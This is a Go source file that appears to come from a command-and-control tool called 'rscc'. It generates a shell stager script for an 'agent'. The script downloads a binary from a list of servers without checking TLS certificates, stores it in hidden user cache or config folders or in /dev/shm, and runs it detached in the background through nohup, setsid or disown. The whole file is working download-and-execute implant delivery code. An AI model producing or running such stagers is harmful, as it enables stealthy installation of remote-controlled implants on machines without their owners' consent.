package scriptgen

import (
	"bytes"
	"fmt"
	"rscc/internal/database/ent"
	"text/template"
)

var shTemplate = `
export PATH="$PATH:/usr/local/sbin:/usr/local/bin:/usr/bin:/bin:/sbin"
download () {
	if command -v curl >/dev/null 2>&1; then
		curl -skLJ --connect-timeout 5 "https://$1" -o "$save_dir/{{ .Name }}"
	elif command -v wget >/dev/null 2>&1; then
		wget --no-check-certificate --content-disposition -q "https://$1" -O "$save_dir/{{ .Name }}"
	else
		exit 1
	fi
}
save_dir="/tmp"
if [ -n "$HOME" ]; then
	if [ -w "$HOME/.cache" ]; then
		save_dir="$HOME/.cache"
	elif [ -w "$HOME/.config" ]; then
		save_dir="$HOME/.config"
	elif [ -w "$HOME/.local" ]; then
		save_dir="$HOME/.local"
	fi
elif [ -w "/dev/shm" ]; then
	save_dir="/dev/shm"
fi
servers=( {{range .Servers}}"{{.}}" {{end}} )
if [ ${#servers[@]} -gt 1 ]; then
	for server in "${servers[@]}"; do
		download "$server{{ .URL }}"
		if [ $? -eq 0 ]; then
			break
		fi
	done
else
	download "{{ index .Servers 0 }}{{ .URL }}"
fi
if [ ! -f "$save_dir/{{ .Name }}" ]; then
	exit 1
fi
echo "Downloaded to $save_dir/{{ .Name }}"
chmod +x "$save_dir/{{ .Name }}"
if command -v nohup >/dev/null 2>&1; then
	echo "nohup $save_dir/{{ .Name }} >/dev/null 2>&1 &"
	nohup $save_dir/{{ .Name }} >/dev/null 2>&1 &
elif command -v setsid >/dev/null 2>&1; then
	echo "setsid $save_dir/{{ .Name }} >/dev/null 2>&1 &"
	setsid $save_dir/{{ .Name }} >/dev/null 2>&1 &
elif command -v disown >/dev/null 2>&1; then
	echo "$save_dir/{{ .Name }} >/dev/null 2>&1 & disown"
	$save_dir/{{ .Name }} >/dev/null 2>&1 & disown
else
	echo "($save_dir/{{ .Name }} >/dev/null 2>&1 &) &"
	($save_dir/{{ .Name }} >/dev/null 2>&1 &) &
fi
`

func GenerateShScript(agent *ent.Agent) (string, error) {
	tmpl, err := template.New("sh").Parse(shTemplate)
	if err != nil {
		return "", fmt.Errorf("failed to parse sh template: %w", err)
	}

	buf := bytes.Buffer{}
	if err := tmpl.Execute(&buf, agent); err != nil {
		return "", fmt.Errorf("failed to execute sh template: %w", err)
	}

	return buf.String(), nil
}
